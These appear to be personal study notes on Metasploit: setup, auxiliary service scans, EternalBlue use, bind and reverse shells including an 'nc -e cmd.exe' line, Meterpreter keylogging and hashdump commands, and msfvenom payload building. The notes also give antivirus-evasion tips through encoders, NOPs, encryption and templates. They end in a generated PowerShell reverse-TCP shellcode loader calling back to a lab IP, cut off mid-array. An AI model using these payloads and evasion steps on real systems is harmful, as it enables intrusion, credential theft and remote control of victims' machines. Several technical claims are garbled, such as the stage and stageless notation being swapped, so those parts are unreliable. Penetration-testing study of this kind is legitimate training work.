---
description: In the cover the baisc of MetaSploit
---

# MetaSploit

## METASPLOIT

> Its Founded by H.D Moore in 2003 (developed in Perl)
>
> Written in RUby in 2007.
>
> Acquired by Rapid7 in 2009
>
> Released as a Metasploit in 2002

> The Metasploit Framework (MSF) is a platfrom of developed and test exploit  used by hacker and its open sources.
>
> Has a world Database and public Tested Exploits
>
> Comes Pre installed in Kali LINUX

## Phases Of MetaSploit

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

### Installation

> Right Way to start metasploit
>
> The first and foremost important before booting framework console it to setup a database for the tracking of the record. To do so, msfdb is a standalone script/tool which helps administrating metasploit database server.

```
sudo apt update && sudo apt install metasploit-framework install
```

Enable postgresql at boot, start the service and initialize MSF database

```
sudo systemctl enable postgresql
sudo systemctl restart postgresql
sudo msfdb init
```

> \#msfdb is the database management of Metasploit , all the sessions are logged when msfdb is started.
>
> It works on port 5433 use the PostgreSQL.
>
> Run it as sudo ..
>
> First time msfdb is activiated.

```
sudo msfdb init
sudo msfdb run
sudo msfdb status
service postsql status
```

### Metasploit Terminilogies

<table data-header-hidden><thead><tr><th valign="top"></th><th valign="top"></th></tr></thead><tbody><tr><td valign="top">Term</td><td valign="top">Description</td></tr><tr><td valign="top">Interface</td><td valign="top">Methods of interacting with the Metasploit Framework (msfconsole, Metasploit cmd)</td></tr><tr><td valign="top">Module</td><td valign="top">Pieces of code that perform a particular task (an exploit)</td></tr><tr><td valign="top">Vulnerability</td><td valign="top">Exploitable flaw or weakness in a computer system or network</td></tr><tr><td valign="top">Exploit</td><td valign="top">Code/Module used to take advantage of a vulnerability</td></tr><tr><td valign="top">Payload</td><td valign="top">Piece of code delivered to the target by an exploit (execute arbitrary commands or provide remote access)</td></tr><tr><td valign="top">Listener</td><td valign="top">Utility that listens for an incoming connection from a target</td></tr></tbody></table>

### Metasploit Types

<table data-header-hidden><thead><tr><th valign="top"></th><th valign="top"></th></tr></thead><tbody><tr><td valign="top">Type</td><td valign="top">Description</td></tr><tr><td valign="top">1218 Auxiliary</td><td valign="top"><p>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</p><p> Basically a active scanner / automated script like nmap which help in information gathering ,  scanning &#x26; Enumeration. Or preattacked scripts.</p></td></tr><tr><td valign="top">Encoders</td><td valign="top"><p>Ensure that payloads are intact to their destination.</p><p>encoders are encodes using the algorithms.</p></td></tr><tr><td valign="top">2327  Exploits</td><td valign="top"><p>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</p><p>Basically take advantages of vulnerability &#x26; Execute the Malware.</p></td></tr><tr><td valign="top">NOPs</td><td valign="top">(No Operation code) Keep the payload sizes consistent across exploit attempts. which are bypass of IPS/IDS Antivirus</td></tr><tr><td valign="top">Payloads</td><td valign="top">Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</td></tr><tr><td valign="top">Plugins</td><td valign="top">Additional scripts can be integrated within an assessment with msfconsole and coexist.</td></tr><tr><td valign="top">Post</td><td valign="top"><p>Wide array of modules to gather information, pivot deeper, etc.</p><p>Exploit the POST will help in maintain access.</p></td></tr><tr><td valign="top">evasions</td><td valign="top">invading the Firewall.</td></tr></tbody></table>

### MetaSploit File Struture

```
ls /usr/share/metasploit-framework
```

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

> MSF File system is intutive and organized by directories & Modules are stored under.

```

$ ls /usr/share/metasploit-framework/modules 
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md

```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### MetaSploit Framework Architecture

* The etc
  * &#x20;/etc. Has all the configuration file for a particular softwares & more.
* The usr/share
  * This directory is where all the shared scripts & in need files are there for a particular softwares.
* So usr/share/metasploit-framework
* As there are many frameworks

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption><p>MetaSploit FrameWork Architecture by oreilly.com</p></figcaption></figure>

### MetaSploit Variables

> An MSF module requires additional information that can be configured through the use of MSF variables,
>
> both _local_ or _global_ variables, called options inside the msfconsole/msfdb.
>
> Variables e.g. (they are based on the selected particular module)

<table data-header-hidden><thead><tr><th valign="top"></th><th valign="top"></th></tr></thead><tbody><tr><td valign="top"><em>LHOST</em></td><td valign="top"><em>attacker's IP address</em></td></tr><tr><td valign="top"><em>LPORT</em></td><td valign="top"><em>attacker's port number (receive reverse connection)</em></td></tr><tr><td valign="top"><em>RHOST</em></td><td valign="top"><em>target's IP address</em></td></tr><tr><td valign="top"><em>RHOSTS</em></td><td valign="top"><em>multiple targets/networks IP addresses</em></td></tr><tr><td valign="top"><em>RPORT</em></td><td valign="top"><em>target port number</em></td></tr></tbody></table>

### MetaSploit Useful And General / Pre Exploit&#x20;

<table data-header-hidden><thead><tr><th valign="top"></th><th></th></tr></thead><tbody><tr><td valign="top">Syntax &#x26; Commands</td><td></td></tr><tr><td valign="top">help</td><td>#help</td></tr><tr><td valign="top">Show versions</td><td># version</td></tr><tr><td valign="top">Show help</td><td>#show –h</td></tr><tr><td valign="top">show all</td><td>#Show all</td></tr><tr><td valign="top">let know what option is availability</td><td># Options</td></tr><tr><td valign="top">let know the advance functionality of that Metasploit service.</td><td># Advance</td></tr><tr><td valign="top">Shows the exploit</td><td># show exploits</td></tr><tr><td valign="top"> </td><td>#search &#x3C;STRING></td></tr><tr><td valign="top">set something</td><td># use &#x3C;MODULE_NAME></td></tr><tr><td valign="top">set something</td><td># set &#x3C;OPTION></td></tr><tr><td valign="top">set something globally</td><td>#setg</td></tr><tr><td valign="top">Run &#x26; execute the exploit</td><td># execute / run</td></tr><tr><td valign="top">Records the sessions and show the available sessions</td><td># Sessions</td></tr><tr><td valign="top">Connect to the target</td><td># Connect</td></tr></tbody></table>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

### MetaSploit BackEnd DataBase

<table data-header-hidden><thead><tr><th valign="top"></th><th></th></tr></thead><tbody><tr><td valign="top">Syntax &#x26; Commands</td><td></td></tr><tr><td valign="top">#service</td><td>to see the services available</td></tr><tr><td valign="top">#host</td><td>to see the host available</td></tr><tr><td valign="top">#vuln</td><td>to see identity vulnerability</td></tr><tr><td valign="top">#creds</td><td>to see the credentials which is found or there in the session</td></tr><tr><td valign="top">#analyez</td><td><p>runnable modules for hosts</p><p>to find similar exploit like analyze exploit name</p></td></tr><tr><td valign="top">#grep</td><td>Linux based commands grep “/+”</td></tr><tr><td valign="top">#load</td><td><p>helps  to upload  nessus scan plugin into Metasploit</p><p>E.g Connect_nessus 127.0.0.1 (username): (<a href="mailto:password)@127.0.0.1:11127">password)@127.0.0.1:11127</a> #connect_nessus 127.0.0.1 admin@admin:11127</p></td></tr></tbody></table>

### Search Exploit

```
search #NAME
search -u #update itself
```

### Auxiliary Service Enumeration Port Scan

```
# search portscan
# use auxiliary/scanner/portscan/tcp
# show options
#set RHOSTS < TARGET_IP>
#set RPORTS <0-65535>
#run
# CTRL+C to cancel the running process
# back

```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

```
run
```

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

### MetaSploit Payload

```
#search eternalblue
#use 0
# specify the identifier
# set payload <PAYLOAD_NAME>
# set RHOSTS <TARGET_IP>

# run
OR 
# exploit

```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

```
run
```

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

### MetaSploit WorkSpaces

> Metasploit Workspaces allows to manage and organize the hosts, data, scans and activities stored in the msfdb.
>
> Import, change, export data
>
> Create, manage, switch between workspaces

```
msfconsole -q
db_status
	[*] Connected to msf. Connection type: postgresql.
#workspace -h

```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

```
workspace 
# current working workspace
	* default
##Create a new workspace
workspace -a hasanrehni

```

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

```
#Change workspace
workspace <WORKSPACE_NAME>
workspace -a hasanrehni


```

## Information Gathering With MetaSploit

### Network Mapper&#x20;

> The Metasploit Framework Allows to import nmap results.

```
banner
db_nmap -n -Pn -p- #TARGETIP
```

> Import Files Scan Database into msfdb

```
dc_import #NMAPFILE
#db_import (nessusfilename)
msf6 > db_import beeboxscan.nessus
[*] Importing 'Nessus XML (v2)' data
[*] Importing host 192.168.100.131
[*] Importing host 192.168.100.130
[*] Successfully imported /home/kali/Downloads/beeboxscan.nessus

```

> Validating the State Nessus Service

```
#netstate -antp
See the Nessus service running.
Go to scan à Nessus export

```

## Auxiliary Network Service Enumeration

> Auxiliary is the same as Nmap Scan but it is in Metasploit database.

### FTP Auxiliary Service Enumeration

```
search auxiliary ftp anonymous
use 0
options
```

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

```
run
```

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

### SMB Auxiliary Service Enumeration

```
search auxiliary smb enumeration
use 0
options
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

```
run
```

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

### SAMBA Auxiliary Service Enumeration

```
search auxiliary samba
use 2
options
run
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### RDP Auxiliary Service Enumeration

```
search auxiliary rdp scanner
use 4
options
run
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### SSH Auxiliary Service Enumeration

> Check SSH Status&#x20;

{% code overflow="wrap" %}
```
sudo ssh status (status/stop/start/reload)
netstat -tulpn | grep sshd # check is ssh is running and which ports
search ssh auxiliary enum
use 2
options
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

```
run
```

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

> More ssh scan

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

### MYSQL Auxiliary Service Enumeration

```
search auxiliary mysql_enum
use 0
options
run
```

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### SMTP Auxiliary Service Enumeration

```
search auxiliary smtp
use 8
options
run
```

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

## SHELL ENVIROMENT

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

#### Executable Formats

> An executable format is a specific way of formatting code so that a computer can directly execute it without further processing.It includes information on the layout of the code, any dependencies, and the entry point for the program.

#### Executable Shell

> EXE for windows
>
> AND
>
> ELF for LinuxCMD

> cmd.exe is a command-line interpreter for Windows that allows users to execute commands and scripts on the system. It provides access to a wide range of system utilities and features,
>
> An Interface that executes other programs or allow as to interact with it along with some additional scripting feature

> shell >> cmd.exe || bin/bash
>
> Shell blinded on a particular port that serves shell as a services -- anyone can commet port ==> Access as a service

> Windows SSH FROM KALI LINUX

{% code overflow="wrap" %}
```
nc.exe -lvp 123 -e cmd.exe (-e means exe the shell execute and print the output 
```
{% endcode %}

> KALI LINUX

```
nc #TARGET #CUSTOMPORT
```

* Shellcode is a small piece of code that is injected into a vulnerable program to perform a specific task. It is usually written in assembly language and is designed to exploit a vulnerability in a program's memory or execution flow.

_SHELLCODE ==> shell + code_

&#x20;                                     _Code (code that has functionality of shell)_



Shell >>  cmd || /bin/bash



```
#dir whoami.exe
#dir sysinfo.exe
#dir ipconfig.exe
```

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

### Blind Shell

* Blind ==> Blind it with Specific Port
* Blind-Shell ==>  Attacker has to connect to victim where as services is served \<target-ip> :\<custom-port> ==>SHELL

Bind >>  attacker will connect to victim

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

* Reverse ==> shell as a service that delivered to an attacker
* Reverse ==>Victim will connect to attacker with shell served  \<target-ip>:custom-port>   =⇒ shell

> Reverse shell >>  home delivery >>  victim will connect to attacker

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

### Shells Terminologies

* Webshell ==> with the ability of web applications language accessing shell kinda functions&#x20;
* Shell à cmd || /bin/bash
* Reverse shell >>   home delivery >>   viticm will connect to attacker
* Bind >>   attacker will connect to viticm

### MeterPreter

* Meterperter Unique program that can be interreacted with Metasploit framework.
* Cannot use natcat or any other connect with meterperter to communication it required some specific client and the client is nothing but metaspoilt framework

#### MeterPreter Core Commands

<table data-header-hidden><thead><tr><th valign="top"></th><th valign="top"></th></tr></thead><tbody><tr><td valign="top">? / --help</td><td valign="top">If not sure of any commands this can be use as an help menu.</td></tr><tr><td valign="top">background</td><td valign="top">This Move the current Session into a background &#x26; Created a Session ID</td></tr><tr><td valign="top">Session</td><td valign="top">It can navigate form one session to different sessions.</td></tr><tr><td valign="top">bglist</td><td valign="top">Allows to access all the sessions/scripts running in the bg.</td></tr><tr><td valign="top">bgkill</td><td valign="top">Used to kill any meterpreter running sessions.</td></tr><tr><td valign="top">bgrun</td><td valign="top">Use this to run a scripty as a bg.</td></tr><tr><td valign="top">migrate</td><td valign="top">Moved the active process into a specific PID.</td></tr><tr><td valign="top">Load</td><td valign="top">Like Metasploit load the plugin There is a function which loads the plugin in meterpreter console.</td></tr><tr><td valign="top">Irb</td><td valign="top">Used to goes into Ruby Scripting mode.</td></tr><tr><td valign="top">quit</td><td valign="top">Terminate the sessions</td></tr><tr><td valign="top">close</td><td valign="top">Close the terminal.</td></tr><tr><td valign="top">read</td><td valign="top">Reads data from chain.</td></tr><tr><td valign="top">write</td><td valign="top">Write data from chain.</td></tr></tbody></table>

#### MeterPrete The File System Commands

<table data-header-hidden><thead><tr><th valign="top"></th><th valign="top"></th></tr></thead><tbody><tr><td valign="top">mkdir</td><td valign="top">Used to make a directory on the victim system.</td></tr><tr><td valign="top">rmdir</td><td valign="top">Used to remove an index from the victim system.</td></tr><tr><td valign="top">del</td><td valign="top">Command for deleting a file on the victim.</td></tr><tr><td valign="top">getwd</td><td valign="top">If you want to print the local directory, then use this command.</td></tr><tr><td valign="top">ls</td><td valign="top">list all files in the current directory.</td></tr><tr><td valign="top">edit</td><td valign="top">Used when you want to edit a file using vim.</td></tr><tr><td valign="top">cd</td><td valign="top">change directory of the victim system.</td></tr><tr><td valign="top">cat</td><td valign="top">Command used to read and output the content of a file.</td></tr></tbody></table>

#### Meterpreter The Network Commands

* ipconfig: Used to display all the network interface key information including IP addresses.
* route: Used to modify or view victims routing table.
* portfwd: Command used to forward a victims port to a remote server.

#### Meterpreter System Commands

* shutdown: Shuts down victims computer.
* reg: Allows you to interact with the victim's registry.
* getpid: Shows the current process ID.
* getuid: Provides information on the user on which the server is running.
* drop\_token: help drop the stolen token.
* kill: terminates the PID process.
* ps: Lists all running processes.
* getprivs: Used when you want to get privileges.
* shell: Opens command shell.
* clearav: helps clear event logs on the victim machine

#### Meterpreter Interface Commands

* set\_desktop: Changes the Meterpreter desktop.
* screeshot: Grabs screenshots on the victim desktop.
* keyscan\_dump: dumps the software keylogger
* keyscan\_stop: Stops the keylogger.
* enumdesktops: Provides a list of all available desktops.
* idletime: checks how long the victim system has been idle.
* keyscan\_start: Starts the keylogger software associated with a process.
* uictl: Enables control of the UI components.

#### Meterpreter privileges Commands

> Escalate the system privileges, you can use the gestsytem command. It uses a 15 built-in way to gain system administrator privileges.

#### Meterpreter HashDump Commands

> The hashdump command to grab the hashes in the password file. Notably, the command often trips AV software, although you can run more stealthy like “run smart\_hashdump” or “run hashdump.” The above scripts will stop the AV from tripping.

## MSFVENOM

* MSFvenom is venom creator , venom is poisons , that is harmful ,Venom is a tool or software for meterpreter is used to create payload
* MSFvenom >>  is a poison
* HARM >>  RCE / Reverse shell || steal some data \<crash your OS /execute any cmd

### Modules

* Modules are the particular functions. Or PARTS
* Msfvenom -L will list all modules.

### Payloads

> PAYLOAD >> malicious piece of code/executable that is designed to harm victim upon executions

```
#msfvenom -L payloads <show the list of payloads>
# msfvenom -L payloads | grep windows <target OS>
#windows/x64/shell_reverse_tcp
#windows/x64/shell/bind_tcp
#windows/x64/meterperter_bind_tcp
# windows/x64/meterperter_reverse_tcp
#windows/powershell_bind_tcp

```

<table data-header-hidden><thead><tr><th valign="top"></th><th valign="top"></th></tr></thead><tbody><tr><td valign="top">[OS] /[Service]/[Host the victim]</td><td valign="top">os:Windows/linux/android/mac_os>\php</td></tr><tr><td valign="top">[ARCHS]  </td><td valign="top">Archs: x32/x64/x86> architecture, (windows/x86/meterpreter_reverse_tcp)</td></tr><tr><td valign="top">[program]</td><td valign="top">Any given functionality like cmd.exe /powershell.exe/bash, (windows/vncinject/reverse_tcp)</td></tr><tr><td valign="top">[stage/stagless] à &#x3C;stage:- ‘/’ /stagelss:- ‘_ ’></td><td valign="top">{it will be next to your program}</td></tr><tr><td valign="top">[connection type]</td><td valign="top">bind_tcp/reverse_tcp</td></tr><tr><td valign="top">[Protocol]</td><td valign="top">Protocols like TCP / UDP</td></tr></tbody></table>

```
#windows/x64/shell_reverse_tcp
#windows/x64/shell/bind_tcp
#windows/x64/meterperter_bind_tcp
# windows/x64/meterperter_reverse_tcp
#windows/powershell_bind_tcp

```

### Stage / StageLess

> Stage will cook the payloads in stage ‘\_’.
>
> Stagless will cook the payloads all together ‘/’.

> Stageless : stageless payload it can be in EXE , C , PYTHON and that exe would having every functionality to communicate with the attacker
>
> Stage :  it required the Metasploit to interreact.

&#x20;

> Stageless: everything is there in that payloads.
>
> Stage : not everything is there in that payloads the reset payloads will be available when connected to attacker.

> Like the name speak it will be in stages like stage1 – stage2 and more..
>
> Attacker generates stage version exe to victim , victim will connect to attacker after that , attacker give victim the stage2 which every functionality to communicate further

**Stageless  >> exe  >>  every functionality >>  to communicate with the attacker**

**Stage >>  only initials communication code will be included and the rest code will be supplied post connections**

### **Formats**

> Frame Transform Formats
>
> * It will give the payloads/shells code, using that shells it can add any program , which can compile and executed to the target.
> * It limits with Metasploit encoders

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.130 lport=5555 -f powershell 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of powershell file: 2503 bytes

```

> That binary is the code which has to be executed manually to PowerShell program for the reverse connection to attacker.
>
> It give more freedom to customize encoders and maybe bypass the antivirus.
>
> Both transform & Execute formats has a difference in size

### Encoders The Encapsulator

> It Encoders the malicious piece of code and it depends on architecture means if it has x64 then use the encoders of x64

```
#Msfvenom -L encoders
#-e x64/xor
#-I <number> for interation means using the encoding multiply times
```

* Before encoders  & After encoders diffeswebsite
* The  only different is in malicious pieces of code.

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.130 lport=5555 -f psh -e x64/xor_context -i 5
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
```

{% hint style="info" %}
The hash of the malicious code changes using encoders and website like virustotal check every antivirus database using the hash of that file is there or nor if they found then its marks as a redflag.

If not found then is called as bypass signature detection.
{% endhint %}

### NOPS

> It add some additional character which has no meaning , it can be use to increase the size also.
>
> Using nops can increase the chances of signature bypass.

```
msfvenom -l nops
```

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

### Platfrom

> Where the payload is executed.

### Architecture

> The architecture like x32,x64,x84 etc

```
--template it will inject the malicious piece  of code into the executable  third party program
-f exe -x nc.exe
msf6 > 
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show option
[-] Invalid parameter "option", use "show -h" for more information
msf6 exploit(multi/handler) > options
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (generic/shell_reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
View the full module info with the info, or info -d command.
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.50.118
lhost => 192.168.50.118
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.50.118:4444 
[*] Sending stage (200774 bytes) to 192.168.50.124
[*] Meterpreter session 1 opened (192.168.50.118:4444 -> 192.168.50.124:51703) at 2023-07-20 17:18:06 +0530
meterpreter > 
meterpreter >

```

### Encrypt

> Its a functionality which helps to encrypt packets levels.

```
msf6 exploit(multi/handler) > msfvenom --list encrypt
[*] exec: msfvenom --list encrypt
 
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
 
Framework Encryption Formats [--encrypt <value>]
================================================
 
    Name
    ----
    aes256
    base64
    rc4
    xor

```

{% hint style="info" %}
Stagless / Non Stagless Payload with Encryption
{% endhint %}

```
msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp
payload => windows/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > options
 	
Module options (exploit/multi/handler):
 
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
 
 
Payload options (windows/meterpreter_reverse_tcp):
 
   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       192.168.50.118   yes       The listen address (an interface may be specified)
   LPORT       4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
View the full module info with the info, or info -d command.
 
msf6 exploit(multi/handler) > run
 
[*] Started reverse TCP handler on 192.168.50.118:4444 
[*] Meterpreter session 3 opened (192.168.50.118:4444 -> 192.168.50.124:51783) at 2023-07-20 17:40:06 +0530
 
meterpreter > [*] Meterpreter session 4 opened (192.168.50.118:4444 -> 192.168.50.124:51784) at 2023-07-20 17:40:06 +0530
dir
Listing: C:\Users\Administrator
===============================
 
Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2023-02-18 16:41:22 +0530  .ssh
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:26 +0530  3D Objects
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  AppData
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  Application Data
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:27 +0530  Contacts
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  Cookies
040555/r-xr-xr-x  0        dir   2023-02-22 12:40:59 +0530  Desktop
040555/r-xr-xr-x  4096     dir   2023-02-16 13:37:27 +0530  Documents
040555/r-xr-xr-x  4096     dir   2023-07-20 12:21:50 +0530  Downloads
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:27 +0530  Favorites
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:27 +0530  Links
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  Local Settings
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:27 +0530  Music
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  My Documents
100666/rw-rw-rw-  1310720  fil   2023-07-12 23:37:08 +0530  NTUSER.DAT
100666/rw-rw-rw-  65536    fil   2023-02-16 13:38:32 +0530  NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TM.blf
100666/rw-rw-rw-  524288   fil   2023-02-16 13:37:15 +0530  NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288   fil   2023-02-16 13:37:15 +0530  NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  NetHood
040555/r-xr-xr-x  0        dir   2023-02-16 13:40:10 +0530  OneDrive
040555/r-xr-xr-x  4096     dir   2023-02-16 14:57:56 +0530  Pictures
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  PrintHood
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  Recent
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:27 +0530  Saved Games
040555/r-xr-xr-x  4096     dir   2023-02-16 13:39:53 +0530  Searches
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  SendTo
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  Start Menu
040777/rwxrwxrwx  0        dir   2023-02-16 13:37:15 +0530  Templates
040555/r-xr-xr-x  0        dir   2023-02-16 13:37:27 +0530  Videos
100666/rw-rw-rw-  362496   fil   2023-02-16 13:37:14 +0530  ntuser.dat.LOG1
100666/rw-rw-rw-  503808   fil   2023-02-16 13:37:14 +0530  ntuser.dat.LOG2
100666/rw-rw-rw-  20       fil   2023-02-16 13:37:15 +0530  ntuser.ini
100777/rwxrwxrwx  73802    fil   2023-07-20 17:27:04 +0530  payload_encrypted.exe
100777/rwxrwxrwx  73802    fil   2023-07-20 17:31:30 +0530  payload_encrypted1.exe
100777/rwxrwxrwx  250880   fil   2023-07-20 17:39:15 +0530  payload_encrypted1_pay.exe
 
meterpreter >

```



### Exploit

> Exploit are particular script too..  which are also called automated payloads.
>
> Exploits Are Automated Scripts that utilized Vulnerabilities to run as a Payloads.
>
> Exploit /multi/handler is a exploit which help to toggle exploits & Payloads with having multiply sessions.
>
> Exploits abused the particular vulnerabilities & perform the malicious activities.

```
#Msfvenom -L formats
Framework Executeable formats
It can straight way executed,  

```

```
┌──(hasanrehni㉿Kali-Linux-full)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.130 lport=5555 -f psh        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3228 bytes
<program where the reverse connection trigger>
$AJavDSMg = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$dMINRLHJd = Add-Type -memberDefinition $AJavDSMg -Name "Win32" -namespace Win32Functions -passthru
</program where the reverse connection trigger>

<payloads which give the reverse connection>
[Byte[]] $JuKDqxuZa = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x5e,0x48,0x1,0xd0,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x15,0xb3,0xc0,0xa8,0x64,0x82,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0